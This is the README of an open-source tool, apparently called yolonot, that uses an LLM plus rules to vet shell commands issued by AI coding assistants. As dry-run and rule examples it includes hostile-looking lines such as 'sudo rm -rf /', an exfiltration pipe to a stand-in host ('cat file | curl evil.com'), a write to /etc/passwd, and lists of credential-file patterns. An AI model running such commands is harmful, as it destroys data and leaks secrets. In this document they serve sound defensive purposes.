<p align="center">
  <img src="assets/logo.png" alt="yolonot" width="180">
</p>

<h1 align="center">yolonot</h1>

<p align="center">
  Smart auto-mode for AI coding assistants. The safe alternative to <code>--dangerously-skip-permissions</code>.<br>
  Built for Claude Code. Also works with Codex CLI, OpenCode, and Gemini CLI.
</p>

<p align="center">
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>
  <a href="https://github.com/sezaakgun/yolonot/actions"><img src="https://github.com/sezaakgun/yolonot/actions/workflows/test.yml/badge.svg" alt="Tests"></a>
  <img src="https://img.shields.io/badge/go-1.25+-00ADD8.svg" alt="Go 1.25+">
</p>

---

yolonot sits between your AI coding assistant and your shell. It uses an LLM to classify every Bash command as safe (allow) or needs-review (ask), with session memory so approved commands don't ask twice and rejected commands stay blocked.

Claude Code is the flagship integration (full allow/ask/deny support). Adapters for Codex CLI, OpenCode, and Gemini CLI ship in-tree — see [Other AI harnesses](#other-ai-harnesses) for each host's caveats.

## Quick Start

### 1. Pick an LLM provider

yolonot calls an LLM to classify every Bash command. You need one of these — pick based on cost vs. latency:

| Provider | Cost | Per-command latency | Notes |
|----------|------|--------------------:|-------|
| **OpenAI** (`gpt-5.4-mini`) | ~10¢/day | ~500ms | Fastest. Needs `OPENAI_API_KEY`. Recommended. |
| **OpenRouter** (free models) | ~10¢/day | 500ms–3s | Broad model choice. Needs `OPENROUTER_API_KEY`. |
| **Ollama** (`gemma4:e4b`) | free | 2–10s | Local, no API key. Install with `brew install ollama && ollama pull gemma4:e4b`. |
| **Claude Code** (default) | free | ~10s | Uses your Claude subscription, no API key, but slowest. |

You can change provider any time with `yolonot provider`.

### 2. Install

```bash
go install github.com/sezaakgun/yolonot@latest

# Make sure Go bin is in PATH
export PATH="$PATH:$(go env GOPATH)/bin"

# First-run wizard: hooks + rules + provider pick
yolonot setup
```

### 3. (Optional) Add Dippy for stricter fast-path coverage

yolonot already installs a built-in fast-path — `fast-allow`, a native Go bash parser — during `yolonot setup`. It short-circuits obvious read-only commands (`ls`, `cat`, `git status`, `kubectl get`, …) **without** an LLM call and with no subprocess overhead.

If you want even broader fast-path coverage, layer [Dippy](https://github.com/ldayton/Dippy) (Lily Dayton's hand-written Python bash parser) on top:

```bash
brew tap ldayton/dippy && brew install dippy
yolonot pre-check add /opt/homebrew/bin/dippy
```

**Dippy is preferred** when you want maximum fast-path coverage — its parser is more thorough on exotic bash. If you'd rather skip the Python runtime, the built-in `fast-allow` alone handles the common cases in-process. Both live in the same pre-check list — run either, both (in any order), or neither. See [Pre-Check Hooks](#external-pre-check-hooks).

### 4. Restart Claude Code

Hooks are read at Claude Code startup, so restart your session to activate yolonot.

## How It Works

Every Bash command goes through this pipeline:

1. **Deny rules** — absolute block, no override, checked first
2. **Pre-check hooks** (ordered list) — includes the built-in `fast-allow` (no-LLM bash parser) and any external hooks like [dippy](https://github.com/ldayton/Dippy); first entry to return `allow` short-circuits
3. **Session memory** — exact match against previously approved commands → instant allow
4. **Session deny** — previously rejected commands → instant block
5. **Session similarity** — LLM compares against approved commands → allow if similar (project-aware)
6. **Allow/Ask rules** — `.yolonot` file patterns → instant decision
7. **Script cache** — SHA256 hash of script files → reuse cached decision
8. **LLM analysis** — 2-class classifier (allow/ask) with severity in reasoning

Sessions are project-aware — a command approved in one project is not auto-approved in a different project within the same session. Session keys include a hash of the git root (or working directory).

`deny` rules are absolute — nothing can override them (not session memory, not LLM). `ask` rules prompt you once, then session memory takes over. `allow` rules are instant but skipped for chained commands, redirects, or sensitive files.

When the LLM is unavailable, yolonot emits a warning ('LLM unreachable, falling back to host permissions') and goes transparent — the host assistant's own permission system handles it.

Session similarity pre-filters by command prefix before calling the LLM, skipping unnecessary API calls when the new command shares no executable with previously approved commands.

### Hook Ordering

yolonot installs two hooks in `~/.claude/settings.json`:

- **PreToolUse** (matcher: `Bash`) — evaluates commands before execution
- **PostToolUse** (matcher: `Bash`) — saves approved commands to session memory

`yolonot setup` places the PreToolUse hook **before** any catch-all (`.*`) hooks. This ensures yolonot evaluates and can block a command before other hooks (like audit loggers) see it. If you have multiple Bash hooks, yolonot should be first in the PreToolUse list.

If you reorder hooks manually in `settings.json`, keep yolonot's PreToolUse entry above other Bash hooks. PostToolUse order doesn't matter — it only records that the command ran.

When yolonot returns `deny`, the command is blocked and no subsequent hooks run. When it returns `allow`, the command proceeds through remaining hooks normally.

## Commands

```
yolonot              Status overview + session summary + update check
yolonot setup        First-run wizard (install + rules + provider)
yolonot provider     Change LLM provider (interactive TUI)
yolonot rules        Show active rules + sensitive patterns
yolonot status       Show session state (approved/asked/denied)
yolonot log          Show recent decisions with LLM timing
yolonot suggest      Analyze history, suggest permanent rules
yolonot stats        Show analytics from decision history
yolonot check        Dry-run: test what the pipeline would decide for a command
yolonot risk         Show/set per-harness risk tier → action policy
yolonot pre-check    Manage pre-checkers (fast-allow + external hooks like dippy)
yolonot quiet        Silence banners for allow decisions (only show ask/deny)
yolonot pause        Disable yolonot for current session (total bypass)
yolonot resume       Re-enable yolonot for current session
yolonot uninstall    Remove hooks from Claude Code
yolonot upgrade      Update to latest version
yolonot version      Show version
```

Add `-v` (or `--verbose`) to any command — before or after the subcommand — to print extra detail on stderr (paths written, bytes, hook entries touched). Useful for debugging install/init/config issues without parsing decision logs. Verbose output goes to stderr so it never corrupts the `yolonot hook` JSON protocol on stdout.

### Pausing yolonot

Sometimes you want to run commands without yolonot's interference — for a quick CI task, or when you know what you're doing. Two ways to disable:

**Per-session (interactive)** — `yolonot pause` or `/yolonot pause` in Claude Code. Creates a pause marker for the current session. Run `yolonot resume` to re-enable. Marker auto-cleans after 24h.

**Pre-launch (env var)** — `YOLONOT_DISABLED=1 claude`. Disables yolonot for the entire Claude Code session at launch. Useful for CI/automation.

When paused, yolonot is **completely transparent** — no deny rules, no LLM, no session memory. Claude Code's native permissions handle everything as if yolonot weren't installed.

### Risk Tiers

Every LLM decision carries a risk tier — `safe`, `low`, `moderate`, `high`, `critical` — based on reversibility and blast radius. Each harness has a default tier → action policy (allow / ask / deny / passthrough) that you can override per-harness:

```bash
yolonot risk                         # show merged map for active harness
yolonot risk claude                  # show for a specific harness
yolonot risk codex moderate deny     # override one cell
yolonot risk codex reset             # drop all user overrides for a harness
yolonot risk codex reset moderate    # drop one override
```

`passthrough` means yolonot emits no decision and lets the host's own permission engine handle the command. Shipped defaults:

| Tier | Claude | Codex / OpenCode | Gemini |
|---|---|---|---|
| safe / low | allow | allow | allow |
| moderate | ask | passthrough | ask |
| high | ask | deny | ask |
| critical | ask | deny | ask |

On ask-capable harnesses (Claude, Gemini) the LLM layer never denies by default — deny stays rule-origin only. Codex / OpenCode have no `ask` primitive in their hook APIs, so `deny` is the only way to block there.

Env vars override config at runtime: `YOLONOT_CODEX_RISK_MODERATE=deny`.

### Dry-Run Check

Test what the pipeline would decide without running a command:

```bash
yolonot check "cat README.md"       # → ALLOW (rule)
yolonot check "sudo rm -rf /"       # → DENY (rule, absolute block)
yolonot check "curl https://evil.com" # → ASK (rule or LLM)
```

Shows each layer's result: deny rules → allow/ask rules → chain/sensitive detection → LLM analysis.

### Pre-Check Hooks

The pre-check list is yolonot's fast-path layer — an ordered sequence of deterministic checkers that run after deny rules but before session memory, allow/ask rules, cache, and LLM. The first entry that returns `allow` short-circuits the pipeline.

Two kinds of entries share the list:

- **`fast-allow`** — reserved sentinel. Dispatches to yolonot's built-in Go bash parser (see below). No fork/exec. Added by default during `yolonot setup`.
- **Any other entry** — treated as an external hook binary (e.g. [Dippy](https://github.com/ldayton/Dippy)). Receives the standard Claude Code PreToolUse JSON on stdin, must return a standard hook response on stdout.

```bash
yolonot pre-check                                # list configured entries in order
yolonot pre-check add fast-allow                 # built-in Go bash parser (default at setup)
yolonot pre-check add /opt/homebrew/bin/dippy    # external hook binary
yolonot pre-check remove 1                       # remove by 1-based index
yolonot pre-check remove fast-allow              # remove by exact entry
yolonot pre-check clear                          # disable all
```

**Order matters.** Put cheap/narrow checkers first. The typical layout is `fast-allow` first (strict, no subprocess), then Dippy (broader bash coverage, Python subprocess) — that way obvious cases never even touch Dippy.

**Contract.** The first entry to return `permissionDecision: "allow"` wins. Anything else (`ask`, `deny`, empty, `{}`, nonzero exit, or 3s timeout for external hooks) falls through to the next entry and ultimately to yolonot's rules + LLM. yolonot deny rules always beat a pre-check allow — Step 0 runs first.

**Observability.** `yolonot check "<cmd>"` walks the list; `fast-allow` is evaluated inline (pure, no side effects), external hooks are listed but not invoked. Decisions show up as `fast_allow` or `pre_check` in `yolonot log` and `yolonot stats`.

**Caveats.**
- Only `allow` short-circuits. If a pre-check denies, the rest of the pipeline still runs and may allow — by design, so a conservative external tool can't accidentally block commands yolonot knows are fine. Use `deny-cmd` rules for hard blocks.
- If a pre-check allows something you wanted yolonot to scrutinize, tighten that checker's own config — yolonot never sees the command once it's allowed.
- Existing configs with `"pre_check": "/path/to/hook"` (single string) keep working; they're parsed as a one-element list. Legacy `"local_allow": true` is auto-migrated to `fast-allow` at the head of the list on next load.

**⚠ Security.** External pre-check binaries execute with *your* user privileges on every single Bash tool invocation. Only add binaries you trust — a malicious or compromised pre-check hook can auto-approve anything by returning `permissionDecision: "allow"`, bypassing yolonot's LLM + rules entirely (deny rules still run first). yolonot sanitizes untrusted passthrough fields (strips ANSI / C0 controls, caps 512 chars) before embedding them in banners, but that only blocks terminal spoofing — it does not prevent a rogue hook from approving commands. `fast-allow` runs in-process so it has no such exposure.

### fast-allow — The Built-in Bash Parser

`fast-allow` uses [mvdan/sh](https://github.com/mvdan/sh) to parse each command and only short-circuits when the AST proves safety:

- Single simple command, or a pipeline of only allowlisted commands
- Head command (`ls`, `cat`, `git status`, `docker ps`, `kubectl get`, etc.) is in the built-in allowlist
- For multiplex tools (`git`, `go`, `docker`, `kubectl`, `npm`, `brew`, ...) the subcommand must be a known read-only one — `git push`, `docker run`, `npm install` all fall through
- No command substitution (`$(...)`, backticks), no process substitution (`<(...)`, `>(...)`), no arithmetic expansion
- No redirect except to `/dev/null` or targets covered by `allow-redirect` rules — `cat foo > /tmp/out` falls through
- No chaining (`&&`, `||`, `;`), no subshells, no brace blocks, no background, no negation
- No prefix assignment (`FOO=bar ls`), no unknown parameter expansion operators (`${x:=bad}`, `${!x}`)

Anything even slightly ambiguous returns to the normal pipeline — session memory, rules, cache, and finally the LLM. **The LLM is still the safety net**; `fast-allow` just skips it for commands where no human would want to review.

**Dippy comparison.** If you want broader fast-path coverage, layer Dippy on after `fast-allow`. Dippy's [Parable](https://github.com/ldayton/Parable) parser is more thorough on exotic bash but adds a Python subprocess per hook invocation. `fast-allow` is deliberately conservative — it falls through to the LLM whenever in doubt, so false positives go to a smarter layer rather than being rubber-stamped. Allowlist ported with attribution from Dippy (MIT).

### Quiet on Allow

By default yolonot emits a short banner for every decision (`yolonot: 🧑‍🚀 <reason>`). If you find the allow banners noisy and only want to hear from yolonot when it blocks or asks, turn them off:

```bash
yolonot quiet          # show current state
yolonot quiet on       # silence allow banners (ask/deny still show)
yolonot quiet off      # restore default (banner on every decision)
```

Quiet mode only affects the user-facing `systemMessage`. The underlying `permissionDecision` + `permissionDecisionReason` still flow to Claude Code, and the decision log (`yolonot log`) is unchanged.

## Skill

After install, `/yolonot` is available as a Claude Code skill:

```
/yolonot             Session summary + command menu
/yolonot status      Full approved/asked/denied lists
/yolonot approve X   Move command to approved
/yolonot deny X      Move command to denied
/yolonot reset       Clear session state
/yolonot log         Recent decisions
/yolonot rules       Show rules
/yolonot suggest     Suggest permanent rules from history
/yolonot check X     Dry-run: test pipeline for a command
/yolonot stats       Show decision analytics
/yolonot risk        Show/set per-harness risk tier → action policy
```

### Analytics

View aggregate statistics from your decision history:

```bash
yolonot stats
```

Shows: total decisions, allow/ask/deny percentages, layer distribution (rule/session/cache/LLM), average LLM latency, instant allows (no LLM needed), top asked commands (rule candidates), and per-project breakdown.

## Rules

Rules live in `.yolonot` files. yolonot walks up from the current working directory collecting every `.yolonot` it finds, stopping at `$HOME`. Closer-to-cwd files win (first match). Then `~/.yolonot/rules` (generated by `setup`) is consulted, plus `~/.yolonot` if it exists as a file.

```
# Format: <action>-<type> <pattern> ["optional message"]
# Actions: allow, deny, ask
# Types:   cmd (command), path (script file), redirect (output target)

# Allow safe patterns
allow-cmd curl localhost*
allow-path scripts/*

# Deny dangerous patterns
deny-cmd *rm -rf /*
deny-cmd *sudo *

# Ask about uncertain patterns
ask-cmd *curl *
ask-cmd *wget *
```

Rules are checked before the LLM, so they're instant and free.

### Walk-Up Discovery

Drop `.yolonot` anywhere up the tree from where Claude Code runs:

```
/Users/you/work/.yolonot              # team-wide rules
/Users/you/work/project/.yolonot      # project-specific overrides
/Users/you/work/project/sub/.yolonot  # per-subdir rules
```

Running from `project/sub/` loads all three in closest-first order. Since rules are first-match-wins, a subdir `.yolonot` can override project-level rules. The walk halts at `$HOME`, so `~/.yolonot` never double-loads.

### Per-Rule Messages

Any rule can carry a trailing `"quoted message"`. When the rule fires, the message is what Claude Code shows in `permissionDecisionReason` — so the model reads *your* reasoning, not the raw pattern.

```
deny-cmd *rm -rf /* "Never. This kills production. Ask me first."
deny-cmd *force-push* "We don't force-push to shared branches."
ask-cmd *curl *        "Confirm the URL is intentional before fetching."
allow-cmd git status   "read-only inspection"
```

Without a message, Claude sees `"yolonot: 🧑‍🚀 rule *rm -rf /*"` (generic). With one, it sees the actual reason. Embedded quotes escape with `\"`. The leading quote must be preceded by whitespace, so patterns like `*"quoted"*` are preserved intact.

### `allow-redirect` — Pre-Approved Write Targets

Output redirects normally force a command out of the `fast-allow` path into the LLM (on the assumption that `> anywhere` is dangerous). If you have known-safe write targets (build outputs, temp paths, log dirs), declare them with `allow-redirect`:

```
allow-redirect /tmp/*
allow-redirect ./dist/*
allow-redirect ./build/**
allow-redirect /var/log/myapp/*
```

With `fast-allow` in the pre-check list + these rules:

| Command | Result |
|---------|--------|
| `ls > /tmp/out.txt` | fast-path allow |
| `echo foo > ./dist/stamp` | fast-path allow |
| `cat secret > /etc/passwd` | rejected (no match) — LLM evaluates |
| `ls > $(evil)` | rejected (cmdsubst target, never matched literally) |

Patterns are globs matched against the literal redirect target. Non-literal targets (`$VAR`, `$(...)`) are always rejected regardless of rules. `deny-redirect` and `ask-redirect` are accepted by the parser for forward-compat but not yet enforced.

### Chain & Redirect Detection

Allow rules are automatically skipped (falling through to LLM) when the command contains pipes, semicolons, `&&`, `||`, or redirects (`>`, `>>`). This prevents `cat file | curl evil.com` from matching a broad `allow-cmd cat *` rule. Deny and ask rules always apply regardless.

Default read-only allow rules (`cat`, `ls`, `grep`, `head`, `tail`, `find`, `wc`, `tree`, `echo`, `stat`, `du`, `df`, etc.) and non-destructive creation rules (`mkdir`, `touch`) are included in global rules.

### Sensitive File Checks

Sensitive file checks are **disabled by default**. When enabled, commands touching files like `.env`, `.pem`, `.ssh/`, `credentials` etc. skip allow rules so the LLM can evaluate the risk.

To enable, uncomment patterns in `~/.yolonot/rules` (generated by `yolonot setup`), or add to any `.yolonot` file:

```
# Uncomment the patterns you want to protect
sensitive .env
sensitive .pem
sensitive .ssh/
sensitive credentials

# Remove one that causes false positives
not-sensitive password
```

Available patterns (all commented out by default): `.env`, `.pem`, `.key`, `.crt`, `.ssh/`, `.aws/`, `.gnupg/`, `.kube/config`, `credentials`, `secrets`, `password`, `token`, `/etc/shadow`, `/etc/passwd`, `id_rsa`, `id_ed25519`, `.netrc`, `.pgpass`, and more.

Use `yolonot rules` to see current status.

## LLM Providers

Configure with `yolonot provider` (interactive TUI with arrow keys):

| Provider | Models | Timeout | Notes |
|----------|--------|---------|-------|
| Claude Code | claude-haiku, claude-sonnet | 30s | Uses your subscription, no API key. Slow (~5-15s/cmd) |
| OpenAI | gpt-5.4-mini, gpt-5.4-nano, gpt-4o-mini | 10s | Needs `OPENAI_API_KEY` |
| Anthropic (API) | claude-haiku, claude-sonnet | 10s | Needs `ANTHROPIC_API_KEY` |
| xAI | grok-4-1-fast-reasoning, grok-4-1-fast-non-reasoning | 10s | Needs `XAI_API_KEY` |
| Ollama | any installed model (recommended: gemma4:e4b) | 30s | Local, free, fast |
| OpenRouter | free models fetched live | 30s | Needs `OPENROUTER_API_KEY` |
| Custom | any URL | 10s | Bring your own endpoint |

Config stored at `~/.yolonot/config.json`. Env vars (`LLM_MODEL`, `LLM_URL`, `LLM_TIMEOUT`) override config.

Timeouts are set automatically per provider. Ollama, OpenRouter, and Claude Code get 30s (slower). API providers get 10s. Override with `LLM_TIMEOUT` env var.

Running `yolonot provider` (or `yolonot setup`) again updates the config. Running `yolonot install` again updates hooks and skill file.

### LLM Response Schema

yolonot prompts the LLM to return a single JSON object. Any provider / model you point it at must emit this shape (the prompt enforces it):

```json
{
  "decision": "allow" | "ask",
  "risk": "safe" | "low" | "moderate" | "high" | "critical",
  "short": "6 words or fewer",
  "reasoning": "one-sentence explanation",
  "compared_to": "optional — similarity comparisons only"
}
```

| Field | Required | Purpose |
|-------|----------|---------|
| `decision` | yes | 2-class classifier. `deny` is reserved for explicit rules + the per-harness risk map; LLMs never emit `deny` directly. |
| `risk` | yes | Categorical tier by reversibility × blast radius. The active harness's RiskMap turns the tier into a final action (allow / ask / deny / passthrough). |
| `short` | no | ≤6-word banner shown in the terminal. Keeps `systemMessage` compact. Falls back to a truncated `reasoning` if missing. |
| `reasoning` | yes | One sentence. Written to `decisions.jsonl` and surfaced via `yolonot log`. |
| `compared_to` | no | Only set by session-similarity comparisons — names the approved command that matched. |

Legacy outputs that emit `confidence` (0.0–1.0) instead of `risk` are mapped to a tier for backward compatibility and logged at verbose level. Migrate your provider prompt to emit `risk` when convenient.

If a model returns unparseable JSON or omits required fields, yolonot treats the LLM as unreachable and falls through to Claude Code's native permission prompt (never a silent allow).

## Eval Suite

Test LLM prompt quality across models:

```bash
# Run all test suites
./yolonot eval --all --model gpt-5.4-mini --runs 1 --verbose

# Compare models
./yolonot eval --suite evals/suites/greenfield.jsonl \
  --model gpt-5.4-mini --model ollama/gemma4:e4b

# Filter by category
./yolonot eval --suite evals/suites/greenfield.jsonl \
  --model gpt-5.4-mini --filter-expected ask --filter-category adversarial

# Test with Claude Code subscription
./yolonot eval --all --model claude-cli/claude-haiku-4-5-20251001 --runs 1 --verbose

# Test with OpenRouter free model
./yolonot eval --all --model openrouter/google/gemma-3-4b-it:free --runs 1 --verbose
```

176 greenfield + 70 brownfield test cases covering read-only ops, production mutations, safe dev work, sensitive commands, exfiltration, redirects, adversarial attacks, and session similarity. Each case shows LLM response time.

## Architecture

```
yolonot (Go binary)
├── main.go         CLI + setup wizard + update checker
├── hook.go         Hook handler pipeline
├── llm.go          LLM client + prompts + claude -p support
├── rules.go        Rule loading + glob matching + chain/redirect/sensitive detection
├── session.go      Session files (approved/asked/denied)
├── config.go       Config + settings.json + install/uninstall
├── tui.go          Interactive TUI (charmbracelet/huh)
├── update.go       GitHub release update checker
├── embed.go        Embedded SKILL.md
├── eval.go         LLM evaluation runner with timing
├── check.go        Dry-run command checker
├── stats.go        Decision analytics
├── similarity.go   Session similarity pre-filtering
├── log.go          Decision logging (JSONL) with duration
├── main_test.go    Unit tests
├── hook_integration_test.go  End-to-end hook pipeline tests
├── skills/
│   └── SKILL.md    Claude Code skill (embedded in binary)
└── evals/
    └── suites/     Test cases (JSONL)
```

## Data

All yolonot data lives at `~/.yolonot/`:

| Path | Purpose |
|------|---------|
| `config.json` | Provider, model, timeout |
| `rules` | Global rules (allow/deny/ask) |
| `sessions/` | Per-session per-project approved/asked/denied lists |
| `cache/` | Script file hash → cached LLM decisions |
| `decisions.jsonl` | Decision log with timestamps and LLM timing |
| `update-check` | Cached update check (once per day) |

## Other AI harnesses

yolonot was built for Claude Code but also ships adapters for other bash-capable AI coding tools. Pick one explicitly with `--harness` (or `YOLONOT_HARNESS=<name>`); otherwise yolonot auto-detects.

| Harness | `ask` prompt support | Notes |
|---------|----------------------|-------|
| **Claude Code** (default) | full 3-state (allow/ask/deny) | Native hook protocol. |
| **Codex CLI** | deny only | Upstream hook API has no user-prompt primitive. Moderate-risk commands fall through to Codex's own permission engine (yolonot goes transparent); high/critical still hard-deny. |
| **OpenCode** | deny only | Plugin hook `tool.execute.before` is throw-to-block or return-to-allow. yolonot maps moderate-risk to allow since empty stdout is treated as allow; high/critical still hard-deny. |
| **Gemini CLI** | full 3-state — **with caveat** (see below) | Needs `--yolo` for `allow` to take effect. |

### Gemini CLI — run with `--yolo`

Gemini's hook protocol has a genuine `ask` primitive (it fires the native TUI confirmation prompt with yolonot's reason), but its scheduler **silently ignores hook `allow` decisions unless YOLO mode is on**. The policy engine runs unconditionally, so without YOLO you'll still see Gemini's own "Allow once / Allow for this session / No" prompts even after yolonot has allowed a command.

```bash
# recommended: yolonot is the sole approval gate
gemini --yolo
```

Or persist it in `~/.gemini/settings.json`:

```json
{ "general": { "defaultApprovalMode": "yolo" } }
```

**Without `--yolo`, yolonot still runs as an extra security layer** — `ask` and `deny` decisions are fully honored, so yolonot can force prompts and hard-block dangerous commands that Gemini would otherwise run without asking. It just can't suppress Gemini's own prompts for commands it auto-allows.

## Uninstall

```bash
yolonot uninstall    # removes hooks + skill, preserves data
```

Data at `~/.yolonot/` is preserved. Delete manually if wanted.

## Acknowledgements

The built-in `fast-allow` pre-checker is heavily inspired by [**Dippy**](https://github.com/lilydayton/dippy) by Lily Dayton — specifically its `SIMPLE_SAFE` allowlist, subcommand-gating approach for multiplex tools (`git`, `docker`, `kubectl`, …), and its hostile-input test corpus. yolonot ports the allowlist tables into Go and re-walks the AST via [`mvdan.cc/sh`](https://github.com/mvdan/sh) instead of Dippy's hand-written Python bash parser (Parable). Where yolonot's parser reaches ambiguity it defers to the LLM — a fallback Dippy doesn't rely on — so the Go port can be stricter (reject-to-LLM) without hurting UX. The `dippy_parity_test.go` corpus and the rules system owe a direct debt to the Dippy project. MIT-licensed, credited in file headers.
